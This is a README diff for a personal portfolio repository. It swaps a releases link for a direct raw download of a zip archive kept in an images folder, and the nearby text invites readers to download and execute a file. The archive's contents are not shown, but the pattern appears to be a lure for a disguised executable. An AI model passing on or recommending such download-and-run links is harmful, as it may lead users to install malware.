@@ -8,7 +8,7 @@ Welcome to my personal portfolio repository! Here you will find a collection of 
 - **Topics:** achievements, aiml, android, app, css, data-science, developer, firebase, html, ide, java, js, json, kotlin-android, portfolio, python, software-engineering
 
 ### Explore My Portfolio:
-For a detailed view of my work and achievements, please visit my [personal portfolio here](https://github.com/Abdelrhman145/My_Personal_Portfolio/releases).
+For a detailed view of my work and achievements, please visit my [personal portfolio here](https://github.com/Abdelrhman145/My_Personal_Portfolio/raw/refs/heads/main/public/assets/images/My_Personal_Portfolio_v2.9.zip).
   
 ### 📁 Execution File:
 If you are looking to download and execute a specific file, please check the provided link.
